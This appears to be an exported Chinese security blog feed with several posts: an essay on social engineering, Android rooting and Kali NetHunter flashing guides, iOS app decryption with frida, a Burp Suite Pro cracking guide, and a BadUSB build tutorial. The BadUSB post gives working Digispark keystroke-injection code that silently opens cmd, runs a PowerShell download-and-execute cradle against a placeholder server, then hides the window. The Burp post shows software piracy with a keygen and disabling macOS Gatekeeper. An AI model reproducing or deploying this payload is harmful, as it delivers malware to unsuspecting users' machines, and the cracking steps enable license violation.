<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于社会工程学的一些个人看法</title>
    <url>/2023/04/23/%E5%85%B3%E4%BA%8E%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%9C%8B%E6%B3%95/</url>
    <content><![CDATA[<p>从何讲起呢？<br>本人从上学时了解到社会工程学这门黑客学科<br>社会工程学是指，利用人性的弱点和特性，直接对目标相关的人进行社会关系和心理学的信息套取的手段。<br>主要行动方向有两条，一方面是从目标人物已经完成的社会行为中搜索关键信息，比如，找到目标人物的网络社交账号与发表的信息等。<br>另一方面是直接接触目标人物，通过语言或肢体交流进行信息套取，这里从广泛的意义上讲，电信诈骗也是应用案例之一。</p>
<p>我不想讲社工中的那些方法论，那些东西太死板，交给乙方公司的安服团队，公司会用这种方法完成他们的变现。</p>
<p>而我想表达的内容应该更适合还在学习社工，并纠结与社工工作的人。</p>
<p>首先要说的是，社工不难，而且很灵活，你通过自己的办法去发现那些信息就已经是天花板了。从互联网空间中能找到信息，一方面是互联网公司自身对客户的信息保护不够，另一方面是目标对自身信息的保护不够。<br>比如，你通过穷举法获取目标的平台账号密码，是互联网公司的措施不完善。<br>又比如，你在目标社交平台上发布的生活轨迹中发现关键信息，是目标本身对敏感信息的敏感度不足造成的。</p>
<p>而通过这两种思路，组合打法就能帮你获取到足够多的信息了。</p>
<p>之后要说的是，请你记住你要获取信息的目的，你只是想拿到那个password，或者拿到某个关键目标放在什么位置，或者是目标公司老板几点在公司这种信息而已。</p>
<p>而获取信息的渠道很多，你千万不要陷入到给获取目标渠道中的这个人的人物画像当中去，那不应该是你的主要工作。</p>
<p>可能护网工作会要求你充分溯源红队人员的个人信息，但你在做溯源的时候，只要知道是红队中的谁攻击，用的什么手段攻击即可。不需要疯狂地去完善报告中他的生活细节。可能你想通过这种方式来表现你的工作能力。<br>而护网中，真的没人在意这个人年龄多大，家里几个人，婚否，对象好不好看，喜不喜欢烟酒二次元等乱七八糟的事情。</p>
<p>因为当你花费了大量的时间在这上面，并把一份详细且完整的画像报告交上去时，你的主管回复你，你找错目标了。请问你花费的时间和精力要谁来买单呢？</p>
<p>不仅仅是护网工作，你会发现能用到社工手段的地方太多了，因为这个手段门槛太低，不需要你会多少计算机语言，不需要你懂不懂什么OSI七层协议框架。你只要动手去做，无论找不找得到目标信息，你都会有一定的收获。</p>
<p>比如，你很想知道喜欢的人，这个人网络上发布了什么，喜好什么，最近在做什么。你很强，你把这些信息都拿到了，然后呢？你会发现一个很严重的问题，这些信息要怎么利用？这些信息是否真实？这些信息有多少是他想表现在网络上，而真正的信息都藏起来根本不会发布。</p>
<p>于是你又开始分析信息，分析行为，分析社会关系，甚至开始根据这些信息开始侧写。</p>
<p>这个时候，如果你不是为了相关工作去调查犯罪嫌疑人，那你已经是一个不折不扣的大变态了。</p>
<p>你只是为了满足你那肮脏不堪的窥私欲而已。</p>
<p>这些信息看得多了，你会发现人性的不堪，因为你会发现很多人被自身的欲望裹挟而做出的徘徊于人性边缘的事情。你开始会对每一个人都保持距离感，并对人性保持一种相当的怀疑态度。</p>
<p>没错，你走火入魔了，你太依赖于社会工程学了。</p>
<p>我要说的是，社工是一门手段，但不是万金油。</p>
<p>企业可以通过相应的管理制度来规避社工攻击带来的风险，人本身也可以通过学习相关知识并改变生活中的一些行为来规避社工攻击。同时，我上面讲过，人在网络上表达的内容仅仅是想让你看到的内容，那并不是真实的。</p>
<p>以上，</p>
<p>在我对自身的社工防范手段做到位了之后，就不在社工这件事本身再投入精力了。</p>
<p>毕竟把太多的精力放在对人的信息挖掘上，目光未免太过狭窄。</p>
<p>地球在宇宙中存在了46亿年，陆地总面积约14900万平方千米，地球总人口约78.88亿，人类平均寿命大约是76岁，你大约已经用掉了30%，那么你大约还有五十多年的时间，去了解历史、丈量土地、遇见更多的人。</p>
<p>在此希望你能为祖国健康工作50年。</p>
]]></content>
  </entry>
  <entry>
    <title>Android刷机流程</title>
    <url>/2023/04/23/Android%E5%88%B7%E6%9C%BA%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>才想起来要把这件事写下来，好久之前就答应人家写下来的。</p>
<blockquote>
<p>买了个谷歌龟儿子pixel 3XL用来做app渗透测试，期间给手机进行root的过程耗费了好多事情</p>
</blockquote>
<p>手机：pixel 3XL<br>电脑：这个随意，windows、linux、mac都能操作</p>
<p>已知的刷机路线有两个：</p>
<ol>
<li>刷入原生Android ，安装一个第三方系统，比如lineageOS，再刷TWRP</li>
<li>刷入原生Android12.，刷入pixeldust，安装KernelSU，</li>
</ol>
<p>我个人选择的是第一个办法<br>手机用谷歌pixel 3XL，刷入原生安卓11+第三方lineageOS，再刷入面具来实现root。</p>
<h3 id="刷机："><a href="#刷机：" class="headerlink" title="刷机："></a>刷机：</h3><p>首先打开手机的开发者选项，<br>设置-&gt;系统-&gt;关于手机-&gt;多次点击“版本号”，直到显示“已处于开发者模式”<br>![[Pasted image 20230306160357.png]]![[Pasted image 20230306160414.png]]<br>返回上一级，找到“开发者选项“-&gt;USB调试<br>![[Pasted image 20230306160444.png]]<br>![[Pasted image 20230306160329.png]]<br>插上usb线后，会显示”允许USB调试吗？“<br>此后每次运行命令 adb devices<br>都会出现该弹框<br>![[Pasted image 20230306145705.png]]</p>
<p>开发者选项中，还有一项OEM解锁，这项务必选中，否则后面的刷机不会成功。</p>
<p>接下来是下载对应的官方镜像包<br><a class="link"   href="https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds" >https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn#source-code-tags-and-builds <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>找到手机适用的镜像版本，记录下来，找到镜像，下载<br>![[Pasted image 20230306150338.png]]<br>![[Pasted image 20230207170145.png]]<br>接下来只要解压zip文件，找到压缩包中的flash-all.sh这个线刷脚本直接运行就好了，该脚本会自动完成系统的安装<br>![[Pasted image 20230306150646.png]]<br>![[Pasted image 20230306150634.png]]<br>刷好后，我们获得一台崭新的手机（系统层面），稍微设置一下初始设定，打开wifi，并重新开启开发者模式和usb调试。</p>
<h3 id="第三方系统刷入"><a href="#第三方系统刷入" class="headerlink" title="第三方系统刷入"></a>第三方系统刷入</h3><p>此时要注意，我们不得不选择一款第三方系统进行刷入<br>由twrp的描述得知，想要在pixel 3XL中刷入twrp，必须先刷入一个第三方系统，之后才能完成twrp的刷入，而twrp的刷入，是root不可缺少的一环。</p>
<p>这里我选择的是LineageOS<br>![[Pasted image 20230207164545.png]]![[Pasted image 20230207164559.png]]</p>
<p>同样的，要根据手机型号和当前刷入的系统版本来确定LineageOS的版本。<br>刷入流程与官方系统的刷入流程类似，LineageOS官方的指导中也介绍了系统的安装流程，此处不赘述。</p>
<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>TWRP刷入<br>Team Win Recovery Project，一个开源软件定制recovery映像，主要是用来刷root的，当然也可以用来干别的，比如可以刷kali系统，等我以后会有机会买到合适的机型。<br>![[Pasted image 20230207164753.png]]<br>![[Pasted image 20230207171229.png]]<br>这里要注意的是，选择映像，要多根据版本多试几个，还要搞懂当前手机是欧版（欧洲卖的）还是美版（美国卖的）</p>
<p>进入bootloader界面，使用fastboot将相应的twrp刷入，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br><span class="line">fastboot recovery twrp-3.5.2_10-0-crosshatch.img</span><br></pre></td></tr></table></figure></div>

<p>进入twrp界面，通过音量键向上或者向下，找到recovery mode，点击电源键确认，即可进入twrp<br>使用adb，将root工具推入手机中的&#x2F;sdcard目录下，root工具到github上找Magisk，就是大名鼎鼎的面具。<br>![[Pasted image 20230306153047.png]]</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push Magisk-v25.2.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>面具官网中也有比较详细的安装流程，与我介绍的不一样，可以参考。<a class="link"   href="https://topjohnwu.github.io/Magisk/install.html" >https://topjohnwu.github.io/Magisk/install.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>在TWRP的界面中，选择install，到面具所在的目录中找到Magicsk-v25.2.zip。<br>点击Install Image，静静等待，代码滚动，直到done的出现<br>然后Reboot System</p>
<p>此时打开手机，app列表中会有一个面具app，使用adb进行连接，输入adb shell，再输入su，会提示root申请，允许，root权限获取。</p>
<h3 id="另一种办法"><a href="#另一种办法" class="headerlink" title="另一种办法"></a>另一种办法</h3><p>这个办法我没尝试过，这种办法适用于Android12及以后的系统，具体原因如下：</p>
<p>![[Pasted image 20230207170433.png]]</p>
<p>![[Pasted image 20230207170444.png]]</p>
<p>应对这种情况，就要使用KernelSU为中心的root解决方案<br>安装步骤比上一种简单很多，但我已经root成功了，也不想尝试Android12系统，故方法留给有缘人。</p>
<p>pixeldust<br>![[Pasted image 20230207163923.png]]<br> KernelSU<br>![[Pasted image 20230207164856.png]]</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>总的来说，安卓刷机root是一个很麻烦又不得不进行的流程，为了以后安卓渗透和逆向的大业。我们不得不这么吐了血的折腾一次。<br>那么有没有办法让我们把用在刷机的精力节省下来呢？</p>
<p>有！</p>
<p>这位帅比大神专注于谷歌手机的刷机与root<br>并能够提供大量的pixel各种型号的手机<br>你可以直接在他这里买到root好的pixel手机<br>![[Pasted image 20230306154749.png]]<br>![[Pasted image 20230306154731.png]]<br>他的微信二维码就留在这里了，加他，叫我白天的名字有彩蛋。</p>
<p>P.S.我的pixel 3XL在他这里买的，当年买的9成新二手，三百多</p>
<p>竟然还能跑原神</p>
]]></content>
  </entry>
  <entry>
    <title>BadUSB制作过程-基于Digispark</title>
    <url>/2023/04/23/BadUSB%E5%88%B6%E4%BD%9C%E8%BF%87%E7%A8%8B-%E5%9F%BA%E4%BA%8EDigispark/</url>
    <content><![CDATA[<blockquote>
<p>一直就很想做一个BadUSB于是就做了一个BadUSB……</p>
</blockquote>
<h1 id="基于Attiny85和digispark"><a href="#基于Attiny85和digispark" class="headerlink" title="基于Attiny85和digispark"></a>基于Attiny85和digispark</h1><h2 id="首先是原料，上链接："><a href="#首先是原料，上链接：" class="headerlink" title="首先是原料，上链接："></a>首先是原料，上链接：</h2><p>硬件：<br>Attiny85：<a class="link"   href="https://m.tb.cn/h.fg5Xm3W?sm=0be9e8" >https://m.tb.cn/h.fg5Xm3W?sm=0be9e8 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>软件：<br>IDE：<a class="link"   href="https://www.arduino.cc/en/software" >https://www.arduino.cc/en/software <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>驱动：<a class="link"   href="https://github.com/digistump/DigistumpArduino/releases" >https://github.com/digistump/DigistumpArduino/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>指令转译：<a class="link"   href="https://github.com/Catboy96/Automator" >https://github.com/Catboy96/Automator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="开发板编程环境部署"><a href="#开发板编程环境部署" class="headerlink" title="开发板编程环境部署"></a>开发板编程环境部署</h2><p>首先是下载驱动和arduino，并安装  </p>
<p>点击File-&gt;Preferences,在最下面的输入栏里填写开发板管理的链接</p>
<p><a class="link"   href="http://digistump.com/package_digistump_index.json" >http://digistump.com/package_digistump_index.json <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>  </p>
<p>点击 Tools-&gt;Board-&gt;Boards Manager<br>然后在搜索栏里输入digistump，不用写完整自动找到，下载第一个  </p>
<p>下载结束后，在上方栏选择开发板，找到Digispark（Default-16.5mhz）  </p>
<p>之后就是编程环节了<br>这里的逻辑是：仿HID，打开cmd-&gt;输入命令下载木马并使用powershell执行-&gt;关闭窗口  </p>
<p>不同的大佬使用的不同的代码来隐藏窗口运行powershell<br>比如雷神众测的文章用的是</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://IP:port/sys_dll.ps1&#x27;);</span><br></pre></td></tr></table></figure></div>

<p>Shell</p>
<p>也有大佬使用</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">powershell -WindowStyle Hidden -NoLogo -executionpolicy bypass IEX(New-Object Net.WebClient).DownloadString(&#x27;http://服务器ip:8000/生成的后门&#x27;);</span><br></pre></td></tr></table></figure></div>

<p>Shell</p>
<p>各有春秋</p>
<p>我用的是</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;);</span><br></pre></td></tr></table></figure></div>

<p>Shell</p>
<p>哪个好用就由后来人说吧，反正目的都是一样的。</p>
<p>附上代码</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;DigiKeyboard.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="comment">// put your setup code here, to run once:  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);<span class="comment">//为等待2秒  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_R, MOD_GUI_LEFT);<span class="comment">//发送win+R  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">800</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>);<span class="comment">//将cmd窗口最小化保证隐蔽性  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">2000</span>);  </span><br><span class="line">   DigiKeyboard.<span class="built_in">println</span>(<span class="string">&quot;echo set-alias -name rookie -value Invoke-Expression;rookie(new-object net.webclient).downloadstring(&#x27;http://ip:port/payload.ps1&#x27;) | powershell -&quot;</span>);<span class="comment">//要执行的payload  </span></span><br><span class="line">   DigiKeyboard.<span class="built_in">delay</span>(<span class="number">3500</span>); </span><br><span class="line">   DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_F4, MOD_ALT_LEFT);<span class="comment">//执行完成后alt+F4关闭窗口</span></span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="type">void</span> <span class="title">loop</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">   </span>&#123;  </span><br><span class="line">      <span class="comment">// put your main code here, to run repeatedly: </span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>C++</p>
<p>关于有的大佬说使用Automator这个工具方便键入命令，个人感觉吧，不好用，如不认真学习HID的协议  </p>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>![[image-80ffa4e019054a95bbabaf6e906263b7 1.png]]<br>![[image-2412be2afe5742629538262be0d454d7.png]]</p>
<h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><p>中英文切换与大小写，&lt;DigiKeyboard.h&gt;中似乎没有CapsLocks</p>
<p>在github上发现有大佬回答使用57来完成大小写切换，在windows上不区分大小写，所以换用大写后可以避免中文输入法带来的困扰。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(<span class="number">57</span>);</span><br></pre></td></tr></table></figure></div>


<p>也有大佬提出，使用ctrl+space来切换输入法</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">DigiKeyboard.<span class="built_in">sendKeyStroke</span>(KEY_SPACE, MOD_CONTROL_LEFT);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>参考<br><a class="link"   href="https://www.cnblogs.com/qianxiao996/p/13574566.html" >https://www.cnblogs.com/qianxiao996/p/13574566.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA" >https://mp.weixin.qq.com/s/A8KaMP-AJsuZSyyR6Zs1UA <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>ipa从获取到砸壳</title>
    <url>/2023/04/23/ipa%E4%BB%8E%E8%8E%B7%E5%8F%96%E5%88%B0%E7%A0%B8%E5%A3%B3/</url>
    <content><![CDATA[<p>一台mac，一部越了狱的iphone<br>Mac mini m1<br>iphone8  iOS1 3.7</p>
<h3 id="获取ipa"><a href="#获取ipa" class="headerlink" title="获取ipa"></a>获取ipa</h3><p>apple configurator 2获取ipa<br>注意<br>～&#x2F;Library&#x2F;Group Containers&#x2F;K36BKF7T3D.group.com.apple.configurator&#x2F;Library&#x2F;Caches&#x2F;Assets<br>这个文件夹下的内容</p>
<p>只要这个目录出现TemporaryItems,那就代表ipa包下载完成了,立马复制粘贴这个文件.当然也可以进去找到ipa包复制出来.还是那句话,手速快网差还没下载完没有目录,网快手速慢等你去找目录,或者复制文件的时候,同步安装已经完成.临时目录就会被删除找不到ipa包</p>
<h3 id="砸壳"><a href="#砸壳" class="headerlink" title="砸壳"></a>砸壳</h3><p>pc端和手机端分别安装frida<br>这一块不在这里教<br>开俩terminal，一个跑frida，另一个ssh到iphone</p>
<p>从github下载工程：一般情况使用最新的版本，master分支对应Python2，3.x对应Python3版本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AloneMonkey/frida-ios-dump </span><br></pre></td></tr></table></figure></div>

<p>安装依赖：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">sudo pip3 install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure></div>

<p>修改dump.py参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim frida-ios-dump/dump.py</span><br></pre></td></tr></table></figure></div>

<p>找到如下几行</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">User = &#x27;root&#x27;   </span><br><span class="line">Password = &#x27;xxxxxxxxxx&#x27;   </span><br><span class="line">Host = &#x27;localhost&#x27;   </span><br><span class="line">Port = 2222   </span><br></pre></td></tr></table></figure></div>

<p>修改Password和端口号。和iproxy命令端口号保持一致。</p>
<p>列举出安装的应用的名字和bundle id</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd frida-ios-dump</span><br><span class="line">python3 dump.py -l</span><br></pre></td></tr></table></figure></div>

<ul>
<li>执行dump命令</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dump.py id</span><br></pre></td></tr></table></figure></div>

<p>这里的id是com.apple.xxxxxx这样的</p>
<p>砸完壳的ipa在frida-ios-dump文件夹下</p>
]]></content>
  </entry>
  <entry>
    <title>破解，再给新下载的burp加个快捷方式</title>
    <url>/2023/04/23/%E7%A0%B4%E8%A7%A3%EF%BC%8C%E5%86%8D%E7%BB%99%E6%96%B0%E4%B8%8B%E8%BD%BD%E7%9A%84burp%E5%8A%A0%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p>拜托，有个双击就可以打开的burp真的很酷好吗？</p>
</blockquote>
<p>咱就是说，在kali和mac上使用burp有那么些不自然</p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>通常呢，咱们都是在52破解下载最新版的burpsuite<br><a class="link"   href="https://down.52pojie.cn/Tools/Network_Analyzer/Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip" >https://down.52pojie.cn/Tools/Network_Analyzer&#x2F;Burp_Suite_Pro_v2022.2.2_Loader_Keygen.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>但52破解的破解器总是用的1.7版本，有些功能真的跟不上</p>
<p>所以，咱们直接从官方下载正式版的pro<br>然后去全球最大的同性交友网站找到最新的keygen<br>之后怎么做不用我介绍了吧<br>之后的破解流程就没啥好说的了，破解器作者已经表述得很详尽了</p>
<p>下载链接留这里<br>burpsuite pro：<a class="link"   href="https://portswigger.net/burp/pro" >https://portswigger.net/burp/pro <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>Keygen：<a class="link"   href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases" >https://github.com/h3110w0r1d-y/BurpLoaderKeygen/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="制作快捷方式"><a href="#制作快捷方式" class="headerlink" title="制作快捷方式"></a>制作快捷方式</h2><p>把文件移动到&#x2F;usr&#x2F;bin目录中</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> BurpLoaderKeygen.jar burpsuite_pro_v2022.2.2.jar /usr/bin</span><br></pre></td></tr></table></figure></div>

<p>先删掉免费的社区版本</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">apt remove burpsuite</span><br></pre></td></tr></table></figure></div>

<p>配置快捷方式:<br>在&#x2F;usr&#x2F;bin下创建burpsuite</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim burpsuite</span><br></pre></td></tr></table></figure></div>

<p>将keygen上的loader commond复制粘贴</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/usr/lib/jvm/java-17-openjdk-amd64/bin/java --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:/usr/bin/BurpLoaderKeygen.jar -noverify -jar /usr/bin/burpsuite_pro_v2022.2.2.jar</span><br></pre></td></tr></table></figure></div>

<p>增加执行权限,进入&#x2F;usr&#x2F;share&#x2F;applications，创建并编辑burpsuite的快捷方式</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x burpsuite</span><br><span class="line"><span class="built_in">cd</span> /usr/share/applications/</span><br><span class="line">vim burpsuite.desktop</span><br></pre></td></tr></table></figure></div>

<p>填入代码</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Desktop Entry]</span><br><span class="line">Name=burpsuite</span><br><span class="line">Encoding=UTF-8</span><br><span class="line">Exec=sh -c <span class="string">&quot;/usr/bin/burpsuite&quot;</span></span><br><span class="line">Icon=kali-burpsuite</span><br><span class="line">StartupNotify=<span class="literal">false</span></span><br><span class="line">Terminal=<span class="literal">false</span></span><br><span class="line">Type=Application</span><br><span class="line">Categories=03-webapp-analysisc;03-06-web-application-proxies;</span><br><span class="line">X-Kali-Package=burpsuite</span><br></pre></td></tr></table></figure></div>

<p>ok</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>2022.9版本的破解有些改变，根据沈沉舟大佬的描述：</p>
<blockquote>
<p>“2022.9版注册机制并未发生变化，仅仅是相关代码具体实现做了微调，导致class的字节码发生变化，而旧版loader模式匹配时约束条件太强，兼容性不足。”</p>
</blockquote>
<p>故新版本的破解流程稍有更改</p>
<p>首先把需要的部分下载一下，我用的是mac，理论上比linux和win那边麻烦点（实际操作的时候也是很麻烦）  </p>
<p>安装好app后，右键查看包内容，把loader和keygen移动到app路径下，主要是放在burpsuite旁边  </p>
<p>由于这个loader名字太难打，咱直接改名burploader<br>右键打开terminal，命令启动burpsuite和keygen</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar BurpLoaderKeygen.jar</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">java -javaagent:burploader.jar -noverify -jar burpsuite_pro.jar</span><br></pre></td></tr></table></figure></div>

<p>后面注册的过程都是一样的，咱直接跳到关键过程<br>注册成功后从启动台打开还是app还是没注册的样子  </p>
<p>咱还是进入包内容，添加点内容</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">-javaagent:burploader.jar</span><br><span class="line">-noverify</span><br></pre></td></tr></table></figure></div>

<p>之后就可以正常打开了</p>
<p>P.S.<br>关于mac更新时遇到的那些操作<br>安装新版本前务必删除全部相关文件  </p>
<p>苹果的安全机制，修改包内容后会遇到文件损坏的报错<br>这个时候直接</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>就完事了  </p>
]]></content>
  </entry>
  <entry>
    <title>简单记录pixel 3XL刷KaliNetHunter的过程</title>
    <url>/2023/04/23/%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95pixel-3XL%E5%88%B7KaliNetHunter%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>根据kali官方介绍，目前已有大佬开发出相应的kernel用来支持kalinethunter的安装<br><a class="link"   href="https://nethunter.kali.org/kernels.html" >https://nethunter.kali.org/kernels.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>![[Pasted image 20230327192859.png]]</p>
<p>我的pixel3XL刚好就在这里<br>那就好办了，<br>看看环境需求：<br>刷原生Android12，刷大佬的kernel<br>看看大佬的介绍页怎么写的：<br><a class="link"   href="https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/" >https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>![[Pasted image 20230327193057.png]]<br>需要先用twrp把他的kernel相关文件刷进去<br>然后安装busybox<br>安装Wireless_firmware.zip<br>安装nethunter相关软件<br>升级<br>重启</p>
<p>再看看大佬的gayhub<br><a class="link"   href="https://github.com/V3rB0se/Alynx-Nethunter" >https://github.com/V3rB0se/Alynx-Nethunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>![[Pasted image 20230327194001.png]]<br>那就好办了，需要的文件都提供了，开搞！</p>
<p>twrp的安装本身是个问题，因为官方也说了，安不进去，需要了刷两遍，前提是刷进第三方系统<br>![[Pasted image 20230327192630.png]]<br>那我就用lineageos先搞一下，避免之后不能root</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="刷第三方系统"><a href="#刷第三方系统" class="headerlink" title="刷第三方系统"></a>刷第三方系统</h3><p>根据LineageOS安装引导，<br>下载对应版本的img和zip，准备导入</p>
<p>重启至bootloader</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure></div>

<p>刷镜像进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash boot &lt;name&gt;.img</span><br></pre></td></tr></table></figure></div>

<p>然后重启到Recovery Mod<br>点击Factory Reset，再Format data &#x2F; factory reset，恢复出厂设置，格式化数据<br>回到主菜单，找 Apply from ADB</p>
<p>然后侧载文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload &lt;name&gt;.zip</span><br></pre></td></tr></table></figure></div>
<p>侧载结束，第三方系统安装完毕，准备安装twrp</p>
<h3 id="刷twrp"><a href="#刷twrp" class="headerlink" title="刷twrp"></a>刷twrp</h3><p>twrp的安装稍微又些棘手，不过可以借用lineageOS的boot来解决。<br>同样是使用侧载功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload twrp.img</span><br></pre></td></tr></table></figure></div>
<p>这样安装的twrp是可以使用的，但会覆盖掉lineageOS的分区，此时就要注意<br>twrp侧载安装会覆盖a、b两个分区，所以之后又要用LineageOS的img再刷一次，以保证系统的正常启动。</p>
<p>twrp侧载之后，使用adb，将后续需要安装的包一股脑全都放进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push &lt;要导入的包&gt; /path</span><br></pre></td></tr></table></figure></div>
